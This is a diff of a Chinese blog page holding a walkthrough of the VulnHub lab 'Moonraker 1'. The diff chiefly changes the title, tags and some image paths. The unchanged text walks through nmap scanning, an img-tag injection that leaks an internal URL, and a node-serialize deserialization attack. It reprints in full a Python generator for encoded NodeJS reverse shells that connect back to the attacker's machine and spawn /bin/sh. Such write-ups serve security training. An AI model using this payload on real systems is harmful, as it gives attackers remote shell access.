@@ -22,15 +22,15 @@
     var CONFIG = {"hostname":"warm-glow.fun","root":"/","scheme":"Mist","version":"7.7.2","exturl":true,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="title: Moonraker 1靶机渗透tags: [渗透测试, vulnhub, Moonraker]categories: write update: 2020-03-13 11:44:53 - 靶机信息： 说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之">
+  <meta name="description" content="- 靶机信息： 说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之前找到并摧毁小人！ 难度：挑战级 flag：&#x2F;root&#x2F;flag.txt 启用DHCP 默认情况下，除了kali上的工具外，没有其他工具 学习目标：客户端攻击，NoSQL，RESTful，NodeJS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Moonraker-1靶机渗透">
+<meta property="og:title" content="Moonraker 1靶机渗透">
 <meta property="og:url" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/index.html">
 <meta property="og:site_name" content="漫漫人生路">
-<meta property="og:description" content="title: Moonraker 1靶机渗透tags: [渗透测试, vulnhub, Moonraker]categories: write update: 2020-03-13 11:44:53 - 靶机信息： 说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之">
+<meta property="og:description" content="- 靶机信息： 说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之前找到并摧毁小人！ 难度：挑战级 flag：&#x2F;root&#x2F;flag.txt 启用DHCP 默认情况下，除了kali上的工具外，没有其他工具 学习目标：客户端攻击，NoSQL，RESTful，NodeJS">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/1.png">
-<meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/2.png">
+<meta property="og:image" content="d:/my_blog/source/_posts/2.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/3.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/4.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/5.png">
@@ -53,7 +53,7 @@
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/22.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/23.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/24.png">
-<meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/25.png">
+<meta property="og:image" content="d:/my_blog/source/_posts/25.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/26.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/27.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/28.png">
@@ -66,9 +66,12 @@
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/35.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/36.png">
 <meta property="og:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/37.png">
-<meta property="article:published_time" content="2020-03-13T03:44:53.606Z">
-<meta property="article:modified_time" content="2020-03-13T03:48:59.857Z">
+<meta property="article:published_time" content="2020-03-13T03:55:39.000Z">
+<meta property="article:modified_time" content="2020-03-13T03:57:16.573Z">
 <meta property="article:author" content="warm glow">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="Moonraker">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/1.png">
 
@@ -84,7 +87,7 @@
   };
 </script>
 
-  <title>Moonraker-1靶机渗透 | 漫漫人生路</title>
+  <title>Moonraker 1靶机渗透 | 漫漫人生路</title>
   
 
 
@@ -161,7 +164,7 @@
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">16</span></a>
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">17</span></a>
 
   </li>
         <li class="menu-item menu-item-categories">
@@ -238,7 +241,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          Moonraker-1靶机渗透
+          Moonraker 1靶机渗透
         </h2>
 
         <div class="post-meta">
@@ -249,7 +252,16 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-03-13 11:44:53 / 修改时间：11:48:59" itemprop="dateCreated datePublished" datetime="2020-03-13T11:44:53+08:00">2020-03-13</time>
+              <time title="创建时间：2020-03-13 11:55:39 / 修改时间：11:57:16" itemprop="dateCreated datePublished" datetime="2020-03-13T11:55:39+08:00">2020-03-13</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-up/" itemprop="url" rel="index"><span itemprop="name">write up</span></a>
+                </span>
             </span>
 
           
@@ -270,19 +282,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>title: Moonraker 1靶机渗透<br>tags: [渗透测试, vulnhub, Moonraker]<br>categories: write up<br>date: 2020-03-13 11:44:53</p>
-<h2 id="靶机信息："><a href="#靶机信息：" class="headerlink" title="- 靶机信息："></a>- 靶机信息：</h2><ul>
+        <h2 id="靶机信息："><a href="#靶机信息：" class="headerlink" title="- 靶机信息："></a>- 靶机信息：</h2><ul>
 <li>说明：您已经收到有关新反派大量投资于太空和激光技术的情报。尽管反派是谁未知，但我们知道动机不祥且世界末日。入侵Moonraker系统，一劳永逸地发现谁在这些诱人的计划背后。在为时已晚之前找到并摧毁小人！</li>
 <li>难度：挑战级</li>
 <li>flag：/root/flag.txt</li>
 <li>启用DHCP</li>
-<li>默认情况下，出了kali上的工具外，没有其他工具</li>
+<li>默认情况下，除了kali上的工具外，没有其他工具</li>
 <li>学习目标：客户端攻击，NoSQL，RESTful，NodeJS，Linux枚举和Google-fu</li>
 </ul>
 <a id="more"></a>
 
 <h2 id="渗透流程："><a href="#渗透流程：" class="headerlink" title="- 渗透流程："></a>- 渗透流程：</h2><p>首先要知道目标靶机的IP，使用<code>nmap -sP 192.168.183.1/24</code><br><img src="1.png" alt="1"></p>
-<p>知道靶机IP后，接下来要扫描靶机端口，看看靶机开启了什么服务。<code>nmap -sV -p- --open 192.168.183.143</code><br><img src="2.png" alt="2"></p>
+<p>知道靶机IP后，接下来要扫描靶机端口，看看靶机开启了什么服务。<code>nmap -sV -p- --open 192.168.183.143</code><br><img src="D:/my_blog/source/_posts/2.png" alt="2"></p>
 <p>开启的端口中22(SSH)、80(http)、3000(nodejs)、5984(couchdb)，这四个端口可能有用，惯例先去80端口的web页面看看。一打开就是一段电影画面，过后出现了三个按钮，都点点看，发现service按钮有新东西。滑到底部，发现给了一个链接，告诉我们如果对服务感兴趣，可以发送一个查询。<br><img src="3.png" alt="3"></p>
 <p>点击，打开一个新的页面，提示销售代表会在5分钟内查看我们发送的信息。<br><img src="4.png" alt="4"></p>
 <p>既然它会查看，那我们的渗透思路如下：可以发送一个img标签<code>&lt;img src=&quot;192.168.183.138/1.txt&quot;&gt;&lt;/img&gt;</code>，这个标签被插入页面后，当销售代表访问那个记录信息的页面时，这个标签就会加载。然后就会访问<code>192.168.183.138</code>即我的kali攻击机上面的1.txt文件，把它当成一张图片在页面上显示出来(这个文件是不是图片，存不存在都可以，它都会访问)。这样我们就可以从apache的日志中知道销售代表访问我们时所处页面的URL了。</p>
@@ -316,7 +327,7 @@
 <p><span class="exturl" data-url="aHR0cHM6Ly9vcHNlY3guY29tL2luZGV4LnBocC8yMDE3LzAyLzA4L2V4cGxvaXRpbmctbm9kZS1qcy1kZXNlcmlhbGl6YXRpb24tYnVnLWZvci1yZW1vdGUtY29kZS1leGVjdXRpb24v6L+Z5Liq5Lq66K6y55qE5q+U6L6D5riF5qWa44CC5oiR566A5Y2V5LuL57uN5LiA5LiLbm9kZWpz5Y+N5bqP5YiX5YyW5ryP5rSe77yM5bCx5pivYHVuc2VyaWFsaXplKClg5piv6YCa6L+H5bCG5bim5pyJ56uL5Y2z6LCD55So55qE5Ye95pWw6KGo6L6+5byP77yISUlGRe+8ieeahOW6j+WIl+WMlkphdmFTY3JpcHTlr7nosaHkvKDpgJLnu5noioLngrnluo/liJfljJbmqKHlnZfkuK3nmoTlh73mlbDvvIzlm6DkuLrmsqHmnInlr7novpPlhaXov5vooYzmo4Dmn6XmiYDku6Xlj6/ku6XliKnnlKjov5nkuKrlh73mlbDmnaXlrp7njrDku7vmhI/ku6PnoIHmiafooYzjgILlm6DkuLrmiJHkuI3mh4Jub2RlanPvvIzmiYDku6XmiJHnm7TmjqXlgJ/nlKjku5bnmoTmiJDmnpzkuobjgII=" title="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/这个人讲的比较清楚。我简单介绍一下nodejs反序列化漏洞，就是`unserialize()`是通过将带有立即调用的函数表达式（IIFE）的序列化JavaScript对象传递给节点序列化模块中的函数，因为没有对输入进行检查所以可以利用这个函数来实现任意代码执行。因为我不懂nodejs，所以我直接借用他的成果了。">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/这个人讲的比较清楚。我简单介绍一下nodejs反序列化漏洞，就是`unserialize()`是通过将带有立即调用的函数表达式（IIFE）的序列化JavaScript对象传递给节点序列化模块中的函数，因为没有对输入进行检查所以可以利用这个函数来实现任意代码执行。因为我不懂nodejs，所以我直接借用他的成果了。<i class="fa fa-external-link"></i></span></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">!/usr/bin/python</span><br><span class="line"><span class="comment"># Generator for encoded NodeJS reverse shells</span></span><br><span class="line"><span class="comment"># Based on the NodeJS reverse shell by Evilpacket</span></span><br><span class="line"><span class="comment"># https://github.com/evilpacket/node-shells/blob/master/node_revshell.js</span></span><br><span class="line"><span class="comment"># Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)</span></span><br><span class="line"><span class="comment"># Insecurety Research (2013) - insecurety.net</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;"</span> % (sys.argv[<span class="number">0</span>])</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">IP_ADDR = sys.argv[<span class="number">1</span>]</span><br><span class="line">PORT = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">charencode</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"""String.CharCode"""</span></span><br><span class="line">    encoded = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">        encoded = encoded + <span class="string">","</span> + str(ord(char))</span><br><span class="line">    <span class="keyword">return</span> encoded[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LHOST = %s"</span> % (IP_ADDR)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] LPORT = %s"</span> % (PORT)</span><br><span class="line">NODEJS_REV_SHELL = <span class="string">'''</span></span><br><span class="line"><span class="string">var net = require('net');</span></span><br><span class="line"><span class="string">var spawn = require('child_process').spawn;</span></span><br><span class="line"><span class="string">HOST="%s";</span></span><br><span class="line"><span class="string">PORT="%s";</span></span><br><span class="line"><span class="string">TIMEOUT="5000";</span></span><br><span class="line"><span class="string">if (typeof String.prototype.contains === 'undefined') &#123; String.prototype.contains = function(it) &#123; return this.indexOf(it) != -1; &#125;; &#125;</span></span><br><span class="line"><span class="string">function c(HOST,PORT) &#123;</span></span><br><span class="line"><span class="string">    var client = new net.Socket();</span></span><br><span class="line"><span class="string">    client.connect(PORT, HOST, function() &#123;</span></span><br><span class="line"><span class="string">        var sh = spawn('/bin/sh',[]);</span></span><br><span class="line"><span class="string">        client.write("Connected!\\n");</span></span><br><span class="line"><span class="string">        client.pipe(sh.stdin);</span></span><br><span class="line"><span class="string">        sh.stdout.pipe(client);</span></span><br><span class="line"><span class="string">        sh.stderr.pipe(client);</span></span><br><span class="line"><span class="string">        sh.on('exit',function(code,signal)&#123;</span></span><br><span class="line"><span class="string">          client.end("Disconnected!\\n");</span></span><br><span class="line"><span class="string">        &#125;);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">    client.on('error', function(e) &#123;</span></span><br><span class="line"><span class="string">        setTimeout(c(HOST,PORT), TIMEOUT);</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">c(HOST,PORT);</span></span><br><span class="line"><span class="string">'''</span> % (IP_ADDR, PORT)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[+] Encoding"</span></span><br><span class="line">PAYLOAD = charencode(NODEJS_REV_SHELL)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"eval(String.fromCharCode(%s))"</span> % (PAYLOAD)</span><br></pre></td></tr></table></figure>
 
-<p>这个Python脚本可以生成反序列化的具有弹shell功能的payload。我们新建一个文件将代码放进去。然后使用Python运行<code>python 1.py 192.168.183.138 1234</code>后面两个参数，第一个参数填kali攻击机的IP，第二个参数填kali接收shell的端口。<br><img src="25.png" alt="25"></p>
+<p>这个Python脚本可以生成反序列化的具有弹shell功能的payload。我们新建一个文件将代码放进去。然后使用Python运行<code>python 1.py 192.168.183.138 1234</code>后面两个参数，第一个参数填kali攻击机的IP，第二个参数填kali接收shell的端口。<br><img src="D:/my_blog/source/_posts/25.png" alt="25"></p>
 <p>因为3000端口的js代码会先将profile字段的值base64解码，然后进行反序列化，所以我们要反着来，确保执行完js代码后，结果是我们生成的这个payload。所以我们要先将生成的payload序列化，要进行这个操作，需要nodejs的node-serialize模块。所以我们要在kali里面安装nodejs。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nodejs  &#x2F;&#x2F;安装nodejs</span><br><span class="line">apt-get install npm  &#x2F;&#x2F;安装nodejs的包管理工具</span><br><span class="line">npm install node-serialize  &#x2F;&#x2F;用npm安装node序列化模块</span><br></pre></td></tr></table></figure>
 
@@ -351,7 +362,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Moonraker-1靶机渗透">https://warm-glow.fun/2020/03/13/Moonraker-1靶机渗透/</a>
+    <a href="https://warm-glow.fun/2020/03/13/Moonraker-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" title="Moonraker 1靶机渗透">https://warm-glow.fun/2020/03/13/Moonraker-1靶机渗透/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -361,6 +372,12 @@
 
 
       <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+              <a href="/tags/vulnhub/" rel="tag"><i class="fa fa-tag"></i> vulnhub</a>
+              <a href="/tags/Moonraker/" rel="tag"><i class="fa fa-tag"></i> Moonraker</a>
+          </div>
 
         
 
@@ -460,7 +477,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
